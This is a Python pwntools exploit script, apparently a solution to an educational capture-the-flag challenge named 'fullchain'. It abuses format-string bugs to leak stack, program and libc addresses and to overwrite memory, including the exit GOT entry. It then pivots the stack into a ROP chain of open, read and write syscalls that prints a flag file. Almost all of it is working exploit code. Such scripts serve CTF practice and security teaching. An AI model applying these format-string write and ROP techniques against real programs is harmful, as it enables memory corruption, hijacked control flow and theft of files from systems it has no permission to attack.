from pwn import *

context.arch= 'amd64'
context.terminal = ['tmux', 'splitw', '-v']

r = process('./fullchain')
# r = remote('edu-ctf.zoolab.org', 30201)

elf = ELF('./fullchain')
libc = ELF('./libc-2.31.so')

# change number of cnt to 5
r.sendlineafter('global or local > ', b'local')
r.sendlineafter('set, read or write > ', b'write%10$p')
stack_base = int(r.recv(19)[5:], 16)
hole = stack_base - 0x2c # rbp-0x8 ~ rbp-0x10 : 16$
print(f'stack_base: {hex(hole)}')
r.sendlineafter('global or local > ', b'local')
r.sendlineafter('set, read or write > ', b'read')
r.sendline(b'A'*0x10 + p64(hole)) 
r.sendlineafter('global or local > ', b'local')
r.sendlineafter('set, read or write > ', b'write%16$n')

# change number of cnt to 1000
r.sendlineafter('global or local > ', b'global')
r.sendlineafter('set, read or write > ', b'read')
r.sendline(b'%1000c%16$hn')
r.sendlineafter('global or local > ', b'global')
r.sendlineafter('set, read or write > ', b'write')

# get the base address of ELF
r.sendlineafter('global or local > ', b'local')
r.sendlineafter('set, read or write > ', b'write%8$p')
elf_base = int(r.recv(19)[5:], 16) - elf.sym['__libc_csu_init']
print(f'elf_base: {hex(elf_base)}')

# call myset to resolve puts from libc
r.sendlineafter('global or local > ', b'local')
r.sendlineafter('set, read or write > ', b'set')
r.sendlineafter('data > ', b'100')
r.sendlineafter('length > ', b'100')

# get the base address of libc
puts_got = elf_base + elf.got['puts']
r.sendlineafter('global or local > ', b'local')
r.sendlineafter('set, read or write > ', b'read')
r.sendline(b'A'*0x10 + p64(puts_got))
r.sendlineafter('global or local > ', b'local')
r.sendlineafter('set, read or write > ', b'write%16$s')
libc_base = int(r.recv(11)[-1:4:-1].hex(), 16) - libc.sym['puts']
print(f'libc_base: {hex(libc_base)}')

# use FSB to write a address in address
def write_address(input, target, offset):
    # print(f'input: {hex(input)}')
    input = hex(input)[2:]
    tmp = []
    for i in range(3):
        tmp.append(int(input[i*4: (i+1)*4], 16))
    tmp.reverse()
    for i in range(3):
        # print(f'{hex(tmp[i])} : {tmp[i]}')
        r.sendlineafter('global or local > ', b'local')
        r.sendlineafter('set, read or write > ', b'read')
        r.sendline(b'A'*0x10 + p64(target + offset + i*2)) 
        r.sendlineafter('global or local > ', b'global') 
        r.sendlineafter('set, read or write > ', b'read')
        r.sendline(b'%' + str(tmp[i]).encode() +  b'c%16$hn')
        r.sendlineafter('global or local > ', b'global')
        r.sendlineafter('set, read or write > ', b'write') 

# use FSB to write a number in address
def write_number(input, target, offset):
    r.sendlineafter('global or local > ', b'local')
    r.sendlineafter('set, read or write > ', b'read')
    r.sendline(b'A'*0x10 + p64(target + offset)) 
    r.sendlineafter('global or local > ', b'global')
    r.sendlineafter('set, read or write > ', b'read')
    if input > 0:
        r.sendline(b'%' + str(input).encode() +  b'c%16$hn')
    else:
        r.sendline(b'%16$hn')
    r.sendlineafter('global or local > ', b'global')
    r.sendlineafter('set, read or write > ', b'write') 

# define some gadgets
pop_rax_ret = libc_base + 0x4a550
pop_rdi_ret = libc_base + 0x26b72
pop_rsi_ret = libc_base + 0x27529
pop_rdx_pop_r12_ret = libc_base + 0x11c371
syscall_ret = libc_base + 0x66229
leave_ret = libc_base + 0x5aa48
exit = libc_base + libc.sym['exit']
exit_got = elf_base + elf.got['exit']

# build ROP chain
rop = [  
    # open('/home/fullchain/flag', 0) => fd = 3
    pop_rdi_ret, stack_base + 0x100,
    pop_rsi_ret, 0,
    pop_rax_ret, 2,
    syscall_ret,

    # read(3, buf, 0x20)
    pop_rdi_ret, 3,
    pop_rsi_ret, stack_base + 0x200,
    pop_rdx_pop_r12_ret, 0x20, 0,
    pop_rax_ret, 0,
    syscall_ret,

    # write(1, buf, 0x20)
    pop_rdi_ret, 1,
    pop_rax_ret, 1,
    syscall_ret,
    exit
]
# write file name to stack_base + 0x100
# file_name = '/home/fullchain/flag'
file_name = './flag'
for i, c in enumerate(file_name):
    write_number(ord(c), stack_base + 0x100, i)

# stack pivoting but still in stack under rbp
write_address(stack_base + 0x20, stack_base, 0)
write_address(leave_ret, stack_base, 0x8)
write_address(leave_ret, exit_got, 0) # 
for i, num in enumerate(rop):
    print(i, hex(num))
    if num > 0x100:
        write_address(num, stack_base + 0x28, i*8)
    else:
        write_number(num, stack_base + 0x28, i*8)

print('finish')
# gdb.attach(r)
write_number(0, stack_base - 0x2c, 0)

r.interactive()
